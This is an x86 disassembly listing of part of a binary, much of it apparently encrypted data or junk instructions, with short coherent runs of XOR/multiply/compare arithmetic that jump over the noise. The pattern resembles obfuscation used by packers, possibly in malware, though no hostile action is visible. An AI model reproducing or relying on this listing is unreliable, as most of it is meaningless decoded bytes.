  402271:	pop    ss
  402272:	popf   
  402273:	test   DWORD PTR [esi-0x3ec5da7d],esi
  402279:	push   cs
  40227a:	push   0xd7a76876
  40227f:	cli    
  402280:	call   0x7ec1:0x781a8a0d
  402287:	sub    BYTE PTR [esi+esi*8],ah
  40228a:	jl     0x40222b
  40228c:	ins    BYTE PTR es:[edi],dx
  40228d:	xor    eax,DWORD PTR [ebp-0x3f9a1182]
  402293:	ins    DWORD PTR es:[edi],dx
  402294:	popa   
  402295:	inc    edi
  402296:	dec    edi
  402297:	sub    BYTE PTR [edx],dh
  402299:	adc    DWORD PTR [edx+0x33],esi
  40229c:	pop    ax
  40229e:	xor    ecx,eax
  4022a0:	pop    ebx
  4022a1:	push   ecx
  4022a2:	jae    0x40229d
  4022a4:	pop    ebp
  4022a5:	daa    
  4022a6:	add    al,0x4a
  4022a8:	jp     0x4022b5
  4022aa:	add    eax,0xba575473
  4022af:	pop    ds
  4022b0:	or     dl,ah
  4022b2:	lea    esi,[ebp-0x462f453c]
  4022b8:	push   cs
  4022b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022ba:	int    0x87
  4022bc:	xchg   esp,eax
  4022bd:	xor    eax,0xcbed44b0
  4022c2:	mov    ecx,0x83dd860c
  4022c7:	dec    edi
  4022c8:	xchg   BYTE PTR [edx+0x2089f823],ch
  4022ce:	call   0x8e864fa4
  4022d3:	inc    ebx
  4022d4:	jmp    0xbbaffab6
  4022d9:	pop    ss
  4022da:	mov    edi,DWORD PTR [ebp-0x642f09c6]
  4022e0:	xchg   ebx,eax
  4022e1:	add    ebx,DWORD PTR [ebx]
  4022e3:	push   ecx
  4022e4:	cmp    al,0x1f
  4022e6:	retf   0x5128
  4022e9:	adc    eax,0x183a7bf5
  4022ee:	inc    esp
  4022ef:	jmp    0x2393:0x3785c22f
  4022f6:	sbb    bh,ch
  4022f8:	jp     0x4022ae
  4022fa:	sbb    eax,0xe75040b0
  4022ff:	or     al,0x31
  402301:	inc    edx
  402302:	sub    edx,DWORD PTR [ebp-0x72]
  402305:	mov    eax,0xede51f7
  40230a:	je     0x402330
  40230c:	sbb    BYTE PTR [ebx],ah
  40230e:	loope  0x402297
  402310:	xchg   cl,al
  402312:	addr16 std 
  402314:	out    dx,al
  402315:	adc    DWORD PTR [edi],eax
  402317:	inc    edi
  402318:	loopne 0x402396
  40231a:	or     eax,0x8f3a578f
  40231f:	sti    
  402320:	mov    ch,0x65
  402322:	pop    eax
  402324:	jl     0x402301
  402326:	je     0x402355
  402328:	call   0xbe71:0xad01d23e
  40232f:	not    al
  402331:	stc    
  402332:	add    al,0x57
  402334:	daa    
  402335:	xor    BYTE PTR ds:0x64f2496a,al
  40233b:	hlt    
  40233c:	jmp    0x402349
  40233e:	jmp    0x40230f
  402340:	mov    edi,DWORD PTR [ebp-0x4]
  402343:	xor    edx,eax
  402345:	not    ebx
  402347:	xor    edi,eax
  402349:	mov    ebx,DWORD PTR ds:0x4292bd
  40234f:	add    ebx,DWORD PTR ds:0x427cf7
  402355:	mov    DWORD PTR ds:0x4292bd,ebx
  40235b:	add    edi,ecx
  40235d:	movzx  ebx,WORD PTR ds:0x427598
  402364:	or     ebx,DWORD PTR ds:0x42c892
  40236a:	mov    DWORD PTR ds:0x427598,ebx
  402370:	add    edx,ecx
  402372:	imul   edx,edi
  402375:	mov    ebx,DWORD PTR ds:0x4292d5
  40237b:	sbb    DWORD PTR ds:0x427d0f,ebx
  402381:	mov    edi,DWORD PTR [ebp-0x8]
  402384:	mov    ebx,DWORD PTR [ebp-0x10]
  402387:	sbb    DWORD PTR ds:0x4292a1,0x3598
  402391:	sub    ebx,edi
  402393:	mov    DWORD PTR ds:0x427d13,0x71c6
  40239d:	cmp    ebx,edx
  40239f:	mov    DWORD PTR ds:0x42759c,0x6366
  4023a9:	ja     0x4023ce
  4023af:	movzx  edx,WORD PTR ds:0x4292d9
  4023b6:	xor    edx,DWORD PTR ds:0x4292a9
  4023bc:	mov    DWORD PTR ds:0x4292d9,edx
  4023c2:	mov    edx,DWORD PTR [ebp-0x4]
  4023c5:	xor    edx,eax
  4023c7:	add    edx,ecx
  4023c9:	jmp    0x402807
  4023ce:	mov    edx,DWORD PTR [ebp-0x2c]
  4023d1:	mov    edi,DWORD PTR [ebp-0x4]
  4023d4:	xor    edx,eax
  4023d6:	xor    edi,eax
  4023d8:	add    edi,ecx
  4023da:	add    edx,ecx
  4023dc:	imul   edx,edi
  4023df:	mov    edi,DWORD PTR [ebp-0x8]
  4023e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4023e5:	sub    ebx,edi
  4023e7:	cmp    ebx,edx
  4023e9:	ja     0x4023f7
  4023ef:	mov    edx,DWORD PTR [ebp-0x28]
  4023f2:	jmp    0x4027f9
  4023f7:	mov    edx,DWORD PTR [ebp-0x30]
  4023fa:	mov    edi,DWORD PTR [ebp-0x4]
  4023fd:	xor    edx,eax
  4023ff:	xor    edi,eax
  402401:	add    edi,ecx
  402403:	add    edx,ecx
  402405:	imul   edx,edi
  402408:	mov    edi,DWORD PTR [ebp-0x8]
  40240b:	mov    ebx,DWORD PTR [ebp-0x10]
  40240e:	sub    ebx,edi
  402410:	cmp    ebx,edx
  402412:	ja     0x402420
  402418:	mov    edx,DWORD PTR [ebp-0x2c]
  40241b:	jmp    0x4027f9
  402420:	mov    edx,DWORD PTR [ebp-0x34]
  402423:	mov    edi,DWORD PTR [ebp-0x4]
  402426:	xor    edx,eax
  402428:	xor    edi,eax
  40242a:	add    edi,ecx
  40242c:	add    edx,ecx
  40242e:	imul   edx,edi
  402431:	mov    edi,DWORD PTR [ebp-0x8]
  402434:	jmp    0x402554
  402439:	ret    
  40243a:	fwait
  40243b:	dec    ebp
  40243c:	int    0x4d
  40243e:	fld    QWORD PTR [ebx-0x63]
  402441:	out    0xff,al
  402443:	loop   0x4024a4
  402445:	inc    ecx
  402446:	jb     0x40245c
  402448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402449:	lea    esi,[esi+0x7c]
  40244c:	jl     0x4024bf
  40244e:	jg     0x4024cc
  402450:	jl     0x4024b5
  402452:	ins    BYTE PTR es:[edi],dx
  402453:	repz push esi
  402455:	mov    al,0x59
  402457:	fistp  DWORD PTR [ecx-0x79]
  40245a:	inc    esp
  40245b:	push   ebp
  40245c:	arpl   WORD PTR [eax-0x43f0346c],bp
  402462:	mov    eax,0xe1c7e5ae
  402467:	push   ecx
  402468:	xor    al,0x6d
  40246a:	lods   al,BYTE PTR ds:[esi]
  40246b:	cmc    
  40246c:	xor    eax,0x33c8bd6a
  402471:	fimul  WORD PTR [esp+esi*8+0x69eb7ec]
  402478:	mov    cl,BYTE PTR [eax+ebp*2+0x5c]
  40247c:	cdq    
  40247d:	jp     0x402435
  40247f:	mov    BYTE PTR [eax],al
  402481:	xor    DWORD PTR [ecx],edx
  402483:	test   al,0x3e
  402485:	xchg   edi,eax
  402486:	sub    al,0x8f
  402488:	jmp    0x402473
  40248a:	or     eax,0xf9c67569
  40248f:	fwait
  402490:	pop    eax
  402491:	mov    ecx,0x66d0b85a
  402496:	pushf  
  402497:	pop    es
  402498:	push   cs
  402499:	mov    ds:0xb451d4fc,al
  40249e:	stos   BYTE PTR es:[edi],al
  40249f:	out    dx,eax
  4024a0:	sub    BYTE PTR [edx-0x4d4923ef],bh
  4024a6:	xlat   BYTE PTR ds:[ebx]
  4024a7:	out    dx,al
  4024a8:	inc    esp
  4024a9:	ja     0x402508
  4024ab:	mov    edi,0xc3a5339e
  4024b0:	cmc    
  4024b1:	xor    esi,ebp
  4024b3:	inc    eax
  4024b4:	loopne 0x40247a
  4024b6:	mov    ds:0x6100e563,al
  4024bb:	xor    al,0xad
  4024bd:	pop    edx
  4024be:	push   esi
  4024bf:	leave  
  4024c0:	or     al,0xfa
  4024c2:	push   ds
  4024c3:	dec    edx
  4024c4:	cmp    dl,0x82
  4024c7:	push   ebp
  4024c8:	loopne 0x40251d
  4024ca:	xchg   ebp,eax
  4024cb:	ret    
  4024cc:	jl     0x40244e
  4024ce:	ins    DWORD PTR es:[edi],dx
  4024cf:	and    eax,0xd2248aac
  4024d4:	adc    dh,dh
  4024d6:	xchg   esp,eax
  4024d7:	pop    ds
  4024d8:	and    al,BYTE PTR ds:0x6b84a1be
  4024de:	mov    WORD PTR [eax-0x5e33de67],gs
  4024e4:	icebp  
  4024e5:	jo     0x4024ab
  4024e7:	aam    0x93
  4024e9:	call   0x3cea:0x92f11f76
  4024f0:	sub    esi,DWORD PTR [ebp+0x4c]
  4024f3:	rol    BYTE PTR [ebx+0x63],cl
  4024f6:	jp     0x402530
  4024f8:	ror    DWORD PTR [eax-0x5a],0x8d
  4024fc:	xchg   esp,eax
  4024fd:	xchg   esi,eax
  4024fe:	ret    
  4024ff:	loope  0x402559
  402501:	call   0x64c4:0x9a17ea6b
  402508:	retf   0x9359
  40250b:	adc    BYTE PTR [edx+0x50],0x8c
  40250f:	loop   0x402511
  402511:	dec    eax
  402512:	enter  0x206d,0x8f
  402516:	outs   dx,DWORD PTR ds:[esi]
  402517:	xchg   esp,eax
  402518:	xor    al,0xbc
  40251a:	out    dx,al
  40251b:	mov    ds:0x702921f,eax
  402520:	push   edx
  402521:	mov    eax,DWORD PTR [eax]
  402523:	dec    ecx
  402524:	adc    eax,0x692940bf
  402529:	jge    0x4024de
  40252b:	xchg   BYTE PTR [edx],cl
  40252d:	mov    eax,0x210da413
  402532:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402533:	fld    QWORD PTR [ecx+0x70da6c1d]
  402539:	inc    eax
  40253a:	ret    0x5be3
  40253d:	push   ebx
  40253e:	addr16 dec edx
  402540:	ins    BYTE PTR es:[edi],dx
  402541:	push   edi
  402542:	dec    ecx
  402543:	and    eax,0xe8c939d7
  402548:	loopne 0x402590
  40254a:	sub    al,0x47
  40254c:	ficom  WORD PTR [ebx]
  40254e:	sbb    eax,0xc5a215f7
  402553:	adc    ecx,DWORD PTR [ebx-0x20d40fa3]
  402559:	cmp    ebx,edx
  40255b:	ja     0x402569
  402561:	mov    edx,DWORD PTR [ebp-0x30]
  402564:	jmp    0x4027f9
  402569:	mov    edx,DWORD PTR [ebp-0x38]
  40256c:	mov    edi,DWORD PTR [ebp-0x4]
  40256f:	xor    edx,eax
  402571:	xor    edi,eax
  402573:	add    edi,ecx
  402575:	add    edx,ecx
  402577:	imul   edx,edi
  40257a:	mov    edi,DWORD PTR [ebp-0x8]
  40257d:	mov    ebx,DWORD PTR [ebp-0x10]
  402580:	sub    ebx,edi
  402582:	cmp    ebx,edx
  402584:	ja     0x402592
  40258a:	mov    edx,DWORD PTR [ebp-0x34]
  40258d:	jmp    0x4027f9
  402592:	mov    edx,DWORD PTR [ebp-0x3c]
  402595:	mov    edi,DWORD PTR [ebp-0x4]
  402598:	xor    edx,eax
  40259a:	xor    edi,eax
  40259c:	add    edx,ecx
  40259e:	add    edi,ecx
  4025a0:	jmp    0x4026c0
  4025a5:	push   ds
  4025a6:	in     al,0x25
  4025a8:	pop    es
  4025a9:	std    
  4025aa:	(bad)  [edx]
  4025ac:	stc    
  4025ad:	dec    edx
  4025ae:	mov    WORD PTR [ebp-0x45],?
  4025b1:	test   al,0xf
  4025b3:	push   edx
  4025b4:	xor    BYTE PTR [esi+0x717c7c09],cl
  4025ba:	jg     0x402638
  4025bc:	jl     0x402608
  4025be:	out    dx,eax
  4025bf:	xor    eax,0x192842d1
  4025c4:	pop    es
  4025c5:	nop
  4025c6:	(bad)  
  4025c7:	aas    
  4025c8:	stos   DWORD PTR es:[edi],eax
  4025c9:	jmp    0x21214d36
  4025ce:	mov    dh,bh
  4025d0:	bound  eax,QWORD PTR [ecx]
  4025d2:	pop    ebx
  4025d3:	div    DWORD PTR [eax+0x34ce3025]
  4025d9:	sub    edi,DWORD PTR [esi+edi*4+0x22]
  4025dd:	add    al,BYTE PTR [ecx+0x303d299d]
  4025e3:	jmp    0x40264f
  4025e5:	mov    esp,0x5d556c06
  4025ea:	repnz add BYTE PTR [esi],dh
  4025ed:	xlat   BYTE PTR ds:[ebx]
  4025ee:	cmp    al,0x47
  4025f0:	or     DWORD PTR [esi],ecx
  4025f2:	mov    ebp,DWORD PTR [edx-0x1e]
  4025f5:	mov    dh,0x55
  4025f7:	std    
  4025f8:	dec    edx
  4025f9:	jg     0x4025fe
  4025fb:	xchg   ecx,eax
  4025fc:	jp     0x402642
  4025fe:	xchg   esp,eax
  4025ff:	mov    ebx,0xabb11960
  402604:	jne    0x402660
  402606:	mov    DWORD PTR [ecx-0x16a25ed4],esi
  40260c:	mov    ds:0x7984240c,eax
  402611:	or     DWORD PTR [edi],edi
  402613:	sbb    DWORD PTR [edi],ecx
  402615:	dec    edi
  402616:	ret    0x33f6
  402619:	mov    ds:0xb4722a0e,al
  40261e:	xor    al,0xb8
  402620:	ins    BYTE PTR es:[edi],dx
  402621:	or     al,0x36
  402623:	cli    
  402624:	pop    eax
  402625:	and    al,0x4d
  402627:	pushf  
  402628:	call   0x6bf54966
  40262d:	push   ecx
  40262e:	cmp    DWORD PTR [ebx],0xffffffcb
  402631:	std    
  402632:	pop    esp
  402633:	iret   
  402634:	mov    eax,0xd0e1359b
  402639:	mov    ebx,DWORD PTR [bp-0x3f]
  40263d:	mov    dl,0xd9
  40263f:	leave  
  402640:	xor    dl,BYTE PTR [eax+0x2c801907]
  402646:	pushf  
  402647:	or     eax,0x565cf023
  40264c:	or     al,0xc8
  40264e:	sti    
  40264f:	btc    DWORD PTR [eax-0x3a32f125],edx
  402656:	mov    dh,0x2
  402658:	hlt    
  402659:	ins    BYTE PTR es:[edi],dx
  40265a:	mov    al,0xb8
  40265c:	fiadd  WORD PTR [esi]
  40265e:	xchg   edi,eax
  40265f:	jmp    0x8a07:0x42d96765
  402666:	loop   0x402644
  402668:	lahf   
  402669:	and    cl,BYTE PTR [edx]
  40266b:	aas    
  40266c:	dec    ebp
  40266d:	repnz arpl di,si
  402670:	jmp    0xbff00bcc
  402675:	shr    DWORD PTR [edx+eiz*8],cl
  402678:	repnz fadd QWORD PTR [ebp+0x4f56c15f]
  40267f:	int    0x47
  402681:	pop    eax
  402682:	rcr    DWORD PTR [eax+0xddbe1be],1
  402688:	jne    0x4026c9
  40268a:	adc    BYTE PTR [ebx-0x370ad50f],0xd8
  402691:	gs dec esi
  402693:	push   ecx
  402694:	cmp    dl,BYTE PTR ds:0x26989ece
  40269a:	sbb    BYTE PTR [ecx+ebx*1-0x4bf4f646],bh
  4026a1:	out    dx,al
  4026a2:	xor    DWORD PTR [edx+0x608b2f43],edi
  4026a8:	add    ebx,DWORD PTR [edx-0x1b177ca4]
  4026ae:	sbb    ebx,DWORD PTR [edx-0x45]
  4026b1:	pop    esp
  4026b2:	xchg   ebp,eax
  4026b3:	dec    edi
  4026b4:	fdivr  st(0),st
  4026b6:	loope  0x4026f2
  4026b8:	sbb    eax,edx
  4026ba:	daa    
  4026bb:	shl    DWORD PTR [edi+0xf74da58],cl
  4026c1:	scas   eax,DWORD PTR es:[edi]
  4026c2:	xlat   BYTE PTR ds:[ebx]
  4026c3:	mov    edi,DWORD PTR [ebp-0x8]
  4026c6:	jmp    0x4027e6
  4026cb:	test   eax,0x4dcf8b5f
  4026d0:	sti    
  4026d1:	jge    0x40274c
  4026d3:	test   BYTE PTR [ebx],0x46
  4026d6:	adc    eax,0x8a259b70
  4026db:	or     DWORD PTR [eax],0x7c
  4026de:	jl     0x402751
  4026e0:	jg     0x40275e
  4026e2:	jl     0x402702
  4026e4:	xchg   edx,eax
  4026e5:	sbb    esp,esi
  4026e7:	lods   eax,DWORD PTR ds:[esi]
  4026e8:	int    0x7d
  4026ea:	cmp    ch,BYTE PTR [ebx+0x3d]
  4026ed:	(bad)  [esi-0x307e38fb]
  4026f3:	bound  edx,QWORD PTR [ecx-0x28]
  4026f6:	or     BYTE PTR [ebx+edx*8-0x7],ch
  4026fa:	mov    WORD PTR ds:0x1821622b,fs
  402700:	shr    BYTE PTR ds:0x203834c5,1
  402706:	mov    ds:0x33063279,al
  40270b:	and    esp,ebx
  40270d:	push   ebx
  40270e:	jbe    0x4026ca
  402710:	lea    eax,[ebx-0x78]
  402713:	jge    0x40274f
  402715:	retf   0x123c
  402718:	pop    eax
  402719:	lods   eax,DWORD PTR ds:[esi]
  40271a:	mov    edx,esp
  40271c:	adc    ebx,eax
  40271e:	out    0xbe,al
  402720:	outs   dx,DWORD PTR ds:[esi]
  402721:	(bad)  
  402722:	and    DWORD PTR [edi+edx*1+0x25a4fe8c],ebx
  402729:	adc    al,0x59
  40272b:	sub    eax,0x8efbbb14
  402730:	pop    es
  402731:	mov    al,ds:0xe9cff6a2
  402736:	adc    al,0xfb
  402738:	pop    ecx
  402739:	dec    edi
  40273a:	jg     0x402781
  40273c:	sub    eax,edx
  40273e:	adc    bl,BYTE PTR [edi+ebx*8-0x1dfce8c5]
  402745:	repnz or BYTE PTR [edx],dl
  402748:	shr    BYTE PTR [ecx],cl
  40274a:	and    BYTE PTR [esi+edx*2+0x15],dl
  40274e:	pop    esi
  40274f:	jnp    0x4027a3
  402751:	aad    0x4b
  402753:	mov    al,0x8e
  402755:	xchg   DWORD PTR [ecx],edi
  402757:	push   ecx
  402758:	daa    
  402759:	mov    DWORD PTR ds:0x85d41ebd,edx
  40275f:	mov    cl,0xfd
  402761:	call   DWORD PTR [edi+0x402d047f]
  402767:	sti    
  402768:	mov    edx,0xbb6e22f9
  40276d:	fidiv  DWORD PTR [ecx-0x4aefe56c]
  402773:	and    bl,BYTE PTR [ecx+0x38b52d75]
  402779:	dec    esp
  40277a:	gs stc 
  40277c:	cwde   
  40277d:	test   bh,bl
  40277f:	and    ecx,DWORD PTR [esi]
  402781:	cmp    esi,DWORD PTR es:[eax+0x55fd3dcd]
  402788:	push   ds
  402789:	(bad)
  40278d:	cld    
  40278e:	inc    ebx
  40278f:	jge    0x40280c
  402791:	fstp   TBYTE PTR [ebx+0x61d0bc0e]
  402797:	in     al,0x82
  402799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40279a:	sbb    dh,ch
  40279c:	adc    DWORD PTR [edx-0xcca0a90],edx
  4027a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027a3:	dec    edi
  4027a4:	cmp    edx,edi
  4027a6:	shl    BYTE PTR [ebx+ecx*4-0x55abe058],1
  4027ad:	cmp    al,0x78
  4027af:	jecxz  0x4027ad
  4027b1:	cmc    
  4027b2:	mov    ds:0x7a5ad087,eax
  4027b7:	scas   eax,DWORD PTR es:[edi]
  4027b8:	sub    DWORD PTR [ebp+0x27a1eb0],ebx
  4027be:	ror    DWORD PTR [eax],cl
  4027c0:	dec    ebp
  4027c1:	xor    eax,0xcecad3bc
  4027c6:	mov    esi,0xd821a8e5
  4027cb:	or     BYTE PTR [edx+0x766ef077],ah
  4027d1:	xchg   esi,eax
  4027d2:	in     al,dx
  4027d3:	out    0xbe,eax
  4027d5:	lods   al,BYTE PTR ds:[esi]
  4027d6:	sbb    DWORD PTR [ecx],esi
  4027d8:	jmp    0x91937942
  4027dd:	or     eax,0xb8a9e3ed
  4027e2:	(bad)  
  4027e3:	outs   dx,BYTE PTR ds:[esi]
  4027e4:	inc    DWORD PTR [ecx-0x75]
  4027e7:	pop    ebp
  4027e8:	lock sub ebx,edi
  4027eb:	cmp    ebx,edx
  4027ed:	mov    edx,DWORD PTR [ebp-0x38]
  4027f0:	jbe    0x4027f9
  4027f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4027f9:	mov    edi,DWORD PTR [ebp-0x4]
  4027fc:	xor    edi,eax
  4027fe:	xor    edx,eax
  402800:	add    edi,ecx
  402802:	add    edx,ecx
  402804:	imul   edx,edi
  402807:	mov    DWORD PTR [ebp+0xc],edx
  40280a:	mov    edx,DWORD PTR [ebp+0xc]
  40280d:	mov    DWORD PTR [ebp-0x24],edx
  402810:	mov    edx,DWORD PTR [ebp-0x8]
  402813:	add    edx,DWORD PTR [ebp-0x40]
  402816:	jmp    0x402936
  40281b:	push   esp
  40281c:	in     al,dx
  40281d:	dec    ebx
  40281e:	dec    ebp
  40281f:	pop    ebx
  402820:	jge    0x402878
  402822:	in     eax,0xc9
  402824:	std    
  402825:	ja     0x402846
  402827:	ret    0xedf7
  40282a:	daa    
  40282b:	test   BYTE PTR [ebx],cl
  40282d:	jl     0x4028ab
  40282f:	jno    0x4028b0
  402831:	jl     0x4028af
  402833:	inc    ebp
  402834:	inc    edx
  402835:	cmp    DWORD PTR [edi-0x57],ecx
  402838:	imul   ebp,DWORD PTR [ebp-0x45],0xffffffd8
  40283c:	mov    cl,0x4f
  40283e:	adc    BYTE PTR [esp+eax*2+0x5f],dl
  402842:	cmp    al,0x7c
  402844:	xchg   esi,eax
  402845:	lods   eax,DWORD PTR ds:[esi]
  402846:	(bad)  
  402848:	lods   al,BYTE PTR ds:[esi]
  402849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40284a:	dec    eax
  40284b:	mov    dh,BYTE PTR ds:0x8935ed71
  402851:	and    DWORD PTR ds:0x69554168,esp
  402857:	popa   
  402858:	fwait
  402859:	cwde   
  40285a:	pop    edi
  40285c:	jbe    0x402808
  40285e:	dec    esi
  40285f:	int    0xee
  402861:	not    DWORD PTR [eiz*4+0x7fb435d1]
  402868:	sub    eax,ecx
  40286a:	xor    esi,DWORD PTR [edi+eax*2-0x44]
  40286e:	pop    eax
  40286f:	cmp    DWORD PTR [bp+si],esi
  402872:	out    0xae,al
  402874:	jo     0x402881
  402876:	inc    ebp
  402877:	inc    ecx
  402878:	arpl   WORD PTR ds:0x98dd244d,ax
  40287e:	mov    cl,0xcf
  402880:	push   eax
  402881:	and    edi,DWORD PTR [edx+0x326f6ff8]
  402887:	loopne 0x402893
  402889:	push   ebp
  40288a:	mov    al,ch
  40288c:	jne    0x40286b
  40288e:	or     DWORD PTR [ecx-0x15],edi
  402891:	(bad)  
  402892:	(bad)  
  402893:	add    bl,BYTE PTR [ebx-0xe]
  402896:	popa   
  402897:	icebp  
  402898:	mov    ebp,0x1b251fe1
  40289d:	xor    dh,bh
  40289f:	cmp    al,BYTE PTR fs:[ecx]
  4028a2:	sahf   
  4028a3:	dec    ecx
  4028a4:	dec    ebp
  4028a5:	xchg   edx,eax
  4028a6:	outs   dx,DWORD PTR ds:[esi]
  4028a7:	mov    ch,0xf9
  4028a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028aa:	outs   dx,DWORD PTR ds:[esi]
  4028ab:	add    al,0x5
  4028ad:	test   BYTE PTR [edx-0x4b],dh
  4028b0:	sti    
  4028b1:	lods   eax,DWORD PTR ds:[esi]
  4028b2:	xchg   ebp,eax
  4028b3:	mov    eax,ds:0xab371885
  4028b8:	adc    DWORD PTR [ebp-0x18],ebp
  4028bb:	jbe    0x4028b6
  4028bd:	inc    edx
  4028be:	icebp  
  4028bf:	pop    edx
  4028c0:	adc    ebx,DWORD PTR [ecx-0x1e06cfc3]
  4028c6:	fild   QWORD PTR [ebx+0x1adeecb8]
  4028cc:	jmp    0x877e:0x62b8c296
  4028d3:	hlt    
  4028d4:	inc    edx
  4028d5:	mov    ecx,esi
  4028d7:	mov    edi,0x4a61c664
  4028dc:	jp     0x4028a7
  4028de:	pop    esi
  4028df:	enter  0xb5e4,0x3a
  4028e3:	addr16 dec edx
  4028e5:	jg     0x4028a8
  4028e7:	mov    fs,WORD PTR [edx]
  4028e9:	inc    edi
  4028ea:	xchg   ebp,eax
  4028eb:	cdq    
  4028ec:	jg     0x402924
  4028ee:	sbb    eax,DWORD PTR [edx-0x60]
  4028f1:	js     0x402873
  4028f3:	and    al,0xae
  4028f5:	(bad)  
  4028f6:	int3   
  4028f7:	mov    esp,ecx
  4028f9:	iret   
  4028fa:	lahf   
  4028fb:	inc    edx
  4028fc:	sub    ebx,edi
  4028fe:	test   al,0x68
  402900:	test   al,0x35
  402902:	sub    DWORD PTR [edi],ecx
  402904:	std    
  402905:	push   edi
  402906:	ficom  WORD PTR gs:[ebx+eiz*1]
  40290a:	push   eax
  40290b:	fsub   DWORD PTR [edi-0x44]
  40290e:	scas   al,BYTE PTR es:[edi]
  40290f:	pop    ebx
  402910:	add    eax,0x69f07c1c
  402915:	and    esi,DWORD PTR [esi+0x2d]
  402918:	cld    
  402919:	outs   dx,BYTE PTR ds:[esi]
  40291a:	(bad)  
  40291b:	in     eax,dx
  40291c:	call   0x1030d86c
  402921:	mov    esp,0xa8bbf67e
  402926:	fsubr  QWORD PTR [esp+edx*1-0x64]
  40292a:	pusha  
  40292b:	pop    ebx
  40292c:	sbb    DWORD PTR [edx+0x2d],ecx
  40292f:	cwde   
  402930:	pop    ss
  402931:	gs fld st(6)
  402934:	mov    eax,0xe845c79e
  402939:	xor    eax,0x89f89c85
  40293e:	push   ebp
  40293f:	in     al,0xc7
  402941:	inc    ebp
  402942:	hlt    
  402943:	xor    al,0x85
  402945:	pushf  
  402946:	clc    
  402947:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40294e:	mov    edx,DWORD PTR [ebp-0x18]
  402951:	xor    edx,eax
  402953:	add    edx,ecx
  402955:	jmp    0x402ae2
  40295a:	mov    edx,DWORD PTR [ebp-0x18]
  40295d:	xor    edx,eax
  40295f:	add    edx,DWORD PTR [ebp-0x14]
  402962:	mov    edi,DWORD PTR [ebp-0x1c]
  402965:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  40296c:	mov    BYTE PTR [ebp+0xf],dl
  40296f:	mov    edx,DWORD PTR [ebp-0xc]
  402972:	xor    edx,eax
  402974:	add    edx,DWORD PTR [ebp-0x14]
  402977:	mov    edi,DWORD PTR [ebp-0x1c]
  40297a:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  402981:	mov    BYTE PTR [ebp+0xb],dl
  402984:	mov    dl,BYTE PTR [ebp+0xf]
  402987:	mov    edi,DWORD PTR [ebp-0xc]
  40298a:	jmp    0x402aaa
  40298f:	inc    eax
  402990:	(bad)
  402993:	imul   edi,DWORD PTR [edx+0x43],0x97beacfd
  40299a:	jno    0x402937
  40299c:	repnz lea ebx,[eax]
  40299f:	cdq    
  4029a0:	or     bh,BYTE PTR [esp+edi*2+0x71]
  4029a4:	jg     0x402a22
  4029a6:	jl     0x40292f
  4029a8:	(bad)  
  4029aa:	pop    esp
  4029ab:	cmp    esp,DWORD PTR [esi+0x29]
  4029ae:	mov    esi,0x582889f3
  4029b3:	and    DWORD PTR [ebx-0xc],0x9d6f332c
  4029ba:	sub    dl,BYTE PTR [bx+di-0x6ad8]
  4029bf:	xor    edi,0x6e92a469
  4029c5:	ret    
  4029c6:	mov    esi,0x62a8d33d
  4029cb:	out    dx,eax
  4029cc:	mov    esp,0x45dfb88d
  4029d1:	mov    ch,0x35
  4029d3:	sbb    DWORD PTR [eax+0xe],0xa0a022f7
  4029da:	xchg   esp,eax
  4029db:	aaa    
  4029dc:	sub    ecx,DWORD PTR [ebx]
  4029de:	iret   
  4029df:	test   al,0x2e
  4029e1:	ja     0x402a1d
  4029e3:	inc    ebp
  4029e4:	scas   eax,DWORD PTR es:[edi]
  4029e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029e6:	ja     0x4029cb
  4029e8:	sbb    dl,BYTE PTR [ebp+0x3ad52dcb]
  4029ee:	sbb    edx,0xfffffff9
  4029f1:	test   DWORD PTR [edi],ebp
  4029f3:	sub    eax,0xdaa856b2
  4029f8:	mov    cs,WORD PTR [esi-0x1487eb73]
  4029fe:	mov    dl,0xcc
  402a00:	add    BYTE PTR [edi],bh
  402a02:	sahf   
  402a03:	sbb    bl,BYTE PTR [edx+0x77]
  402a06:	repz popa 
  402a08:	lock fnsave [edi]
  402a0b:	imul   edx,DWORD PTR [ebx+0x1d],0xffffffc8
  402a0f:	loope  0x402a26
  402a11:	das    
  402a12:	mov    dl,0xdf
  402a14:	mov    ah,0x8e
  402a16:	cmp    DWORD PTR [ebx+eax*4],ebx
  402a19:	call   0x3185077c
  402a1e:	test   al,0xa5
  402a20:	(bad)  
  402a22:	clc    
  402a23:	sub    esp,DWORD PTR ds:0xf389c770
  402a29:	jg     0x4029f1
  402a2b:	retf   
  402a2c:	jg     0x4029da
  402a2e:	retf   0x3c36
  402a31:	aas    
  402a32:	div    DWORD PTR [edx+edi*8+0x4f9fbf65]
  402a39:	xchg   ebp,eax
  402a3a:	mov    eax,ds:0x1acc7ce9
  402a3f:	cs pop ecx
  402a41:	iret   
  402a42:	push   esp
  402a43:	mov    bl,0x22
  402a45:	xchg   ah,cl
  402a47:	mov    cl,0x2e
  402a49:	push   0xffffffc1
  402a4b:	add    BYTE PTR [esi+0xdb89e93],ch
  402a51:	test   esi,0x612897eb
  402a57:	and    esp,DWORD PTR [edx+0x39]
  402a5a:	push   esi
  402a5b:	out    0xbf,eax
  402a5d:	push   ebx
  402a5e:	(bad)  
  402a5f:	jne    0x402a13
  402a61:	inc    esi
  402a62:	push   ecx
  402a63:	int    0x95
  402a65:	push   esp
  402a66:	(bad)  
  402a67:	jmp    0x10ed:0x748ace93
  402a6e:	mov    ds:0xf5694c15,eax
  402a73:	in     al,dx
  402a74:	lods   eax,DWORD PTR ds:[esi]
  402a75:	test   eax,0x2ab48526
  402a7a:	push   ecx
  402a7c:	stc    
  402a7d:	into   
  402a7e:	pop    ss
  402a7f:	mov    BYTE PTR [edi],ch
  402a81:	sbb    DWORD PTR [esi],0xe1293414
  402a87:	shl    BYTE PTR [edx+0x61],cl
  402a8a:	pusha  
  402a8b:	iret   
  402a8c:	push   edi
  402a8d:	cdq    
  402a8e:	adc    al,BYTE PTR [ebx+0xb]
